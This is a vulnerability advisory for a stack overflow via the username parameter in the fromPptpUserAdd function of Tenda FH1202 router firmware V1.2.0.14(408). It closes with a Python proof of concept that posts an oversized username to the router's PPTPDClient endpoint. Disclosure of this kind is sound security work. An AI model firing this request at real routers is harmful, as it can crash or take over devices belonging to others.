# Tenda FH1202 fromPptpUserAdd
### Overview
vendor: Tenda
product: FH1202
version: V1.2.0.14(408)
type: Stack Overflow
### Vulnerability Description
Tenda FH1202 V1.2.0.14(408) were discovered to contain a stack overflow via the username parameter in the fromPptpUserAdd function.
### Vulnerability details
In function fromPptpUserAdd line 24, it reads in a user-provided parameter `username`, and the variable is passed to the `sprintf` function without any length check, which may overflow the stack-based buffer `s_4`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/10.png)
![](images/11.png)

### POC
```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/PPTPDClient"

data = {
    "username": "a" * 4000,
    "opttype": "2",
    "flag": "1"
}

response = requests.post(url, data=data)
print(response.text)
```

![](images/12.png)
